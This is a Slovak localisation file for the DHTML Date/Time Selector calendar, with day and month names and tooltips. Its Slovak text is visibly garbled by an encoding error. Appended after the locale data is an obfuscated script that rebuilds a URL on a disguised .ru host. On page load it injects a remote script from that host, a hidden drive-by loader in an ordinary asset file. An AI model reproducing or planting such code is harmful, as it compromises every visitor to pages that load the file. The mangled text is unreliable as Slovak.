// ** I18N

// Calendar SK language
// Author: Peter Valach (pvalach@gmx.net)
// Encoding: utf-8
// Last update: 2003/10/29
// Distributed under the same terms as the calendar itself.

// full day names
Calendar._DN = new Array
("NedeÄľa",
 "Pondelok",
 "Utorok",
 "Streda",
 "Ĺ tvrtok",
 "Piatok",
 "Sobota",
 "NedeÄľa");

// short day names
Calendar._SDN = new Array
("Ned",
 "Pon",
 "Uto",
 "Str",
 "Ĺ tv",
 "Pia",
 "Sob",
 "Ned");

// full month names
Calendar._MN = new Array
("JanuĂˇr",
 "FebruĂˇr",
 "Marec",
 "AprĂ­l",
 "MĂˇj",
 "JĂşn",
 "JĂşl",
 "August",
 "September",
 "OktĂłber",
 "November",
 "December");

// short month names
Calendar._SMN = new Array
("Jan",
 "Feb",
 "Mar",
 "Apr",
 "MĂˇj",
 "JĂşn",
 "JĂşl",
 "Aug",
 "Sep",
 "Okt",
 "Nov",
 "Dec");

// tooltips
Calendar._TT = {};
Calendar._TT["INFO"] = "O kalendĂˇri";

Calendar._TT["ABOUT"] =
"DHTML Date/Time Selector\n" +
"(c) dynarch.com 2002-2005 / Author: Mihai Bazon\n" +
"PoslednĂş verziu nĂˇjdete na: http://www.dynarch.com/projects/calendar/\n" +
"DistribuovanĂ© pod GNU LGPL.  ViÄŹ http://gnu.org/licenses/lgpl.html pre detaily." +
"\n\n" +
"VĂ˝ber dĂˇtumu:\n" +
"- PouĹľite tlaÄŤidlĂˇ \xab, \xbb pre vĂ˝ber roku\n" +
"- PouĹľite tlaÄŤidlĂˇ " + String.fromCharCode(0x2039) + ", " + String.fromCharCode(0x203a) + " pre vĂ˝ber mesiaca\n" +
"- Ak ktorĂ©koÄľvek z tĂ˝chto tlaÄŤidiel podrĹľĂ­te dlhĹˇie, zobrazĂ­ sa rĂ˝chly vĂ˝ber.";
Calendar._TT["ABOUT_TIME"] = "\n\n" +
"VĂ˝ber ÄŤasu:\n" +
"- Kliknutie na niektorĂş poloĹľku ÄŤasu ju zvĂ˝Ĺˇi\n" +
"- Shift-klik ju znĂ­Ĺľi\n" +
"- Ak podrĹľĂ­te tlaÄŤĂ­tko stlaÄŤenĂ©, posĂşvanĂ­m menĂ­te hodnotu.";

Calendar._TT["PREV_YEAR"] = "PredoĹˇlĂ˝ rok (podrĹľte pre menu)";
Calendar._TT["PREV_MONTH"] = "PredoĹˇlĂ˝ mesiac (podrĹľte pre menu)";
Calendar._TT["GO_TODAY"] = "PrejsĹĄ na dneĹˇok";
Calendar._TT["NEXT_MONTH"] = "Nasl. mesiac (podrĹľte pre menu)";
Calendar._TT["NEXT_YEAR"] = "Nasl. rok (podrĹľte pre menu)";
Calendar._TT["SEL_DATE"] = "ZvoÄľte dĂˇtum";
Calendar._TT["DRAG_TO_MOVE"] = "PodrĹľanĂ­m tlaÄŤĂ­tka zmenĂ­te polohu";
Calendar._TT["PART_TODAY"] = " (dnes)";
Calendar._TT["MON_FIRST"] = "ZobraziĹĄ pondelok ako prvĂ˝";
Calendar._TT["SUN_FIRST"] = "ZobraziĹĄ nedeÄľu ako prvĂş";
Calendar._TT["CLOSE"] = "ZavrieĹĄ";
Calendar._TT["TODAY"] = "Dnes";
Calendar._TT["TIME_PART"] = "(Shift-)klik/ĹĄahanie zmenĂ­ hodnotu";

// date formats
Calendar._TT["DEF_DATE_FORMAT"] = "$d. %m. %Y";
Calendar._TT["TT_DATE_FORMAT"] = "%a, %e. %b";

Calendar._TT["WK"] = "tĂ˝Ĺľ";


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';